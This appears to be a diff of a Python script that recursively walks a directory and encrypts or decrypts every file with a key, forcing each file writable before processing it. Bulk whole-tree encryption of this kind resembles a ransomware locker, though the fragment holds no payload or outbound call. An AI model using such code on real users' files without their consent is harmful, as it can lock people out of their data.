@@ -84,7 +84,11 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
     filesChanged = 0
     for subdir, dirs, files in os.walk(rootDirectionary):
         for file in files:
+            
+            
             filename = os.path.join(subdir, file)
+            os.chmod(filename, stat.S_IWRITE)
+            os.chmod(filename, stat.S_IWUSR)
             try:
                 
                 print(filename)
@@ -97,11 +101,11 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
                     print("File is in use.")
                     continue
             except IOError:
+                print("dont know")
                 continue    
             os.rename(newFilename, filename)
             
-            os.chmod(filename, stat.S_IWRITE)
-            os.chmod(filename, stat.S_IWUSR)
+            
                 
             if function == 0:    
                     try:
